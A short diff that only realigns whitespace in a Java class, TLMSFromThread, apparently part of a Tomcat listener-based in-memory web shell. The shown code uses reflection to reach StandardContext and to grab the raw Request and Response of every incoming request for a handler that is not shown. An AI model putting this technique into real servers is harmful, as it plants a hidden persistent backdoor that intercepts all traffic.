@@ -28,8 +28,8 @@ public class TLMSFromThread implements ServletRequestListener {
             } catch (Exception ignored) {
                 Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                 field.setAccessible(true);
-                Object root   = field.get(webappClassLoaderBase);
-                Field  field2 = root.getClass().getDeclaredField("context");
+                Object root = field.get(webappClassLoaderBase);
+                Field field2 = root.getClass().getDeclaredField("context");
                 field2.setAccessible(true);
 
                 standardContext = (StandardContext) field2.get(root);
@@ -50,9 +50,9 @@ public class TLMSFromThread implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
             RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
-            Field         field         = requestFacade.getClass().getDeclaredField("request");
+            Field field = requestFacade.getClass().getDeclaredField("request");
             field.setAccessible(true);
-            Request  request  = (Request) field.get(requestFacade);
+            Request request = (Request) field.get(requestFacade);
             Response response = request.getResponse();
             requestInitializedHandle(request, response);
         } catch (Exception ignore) {
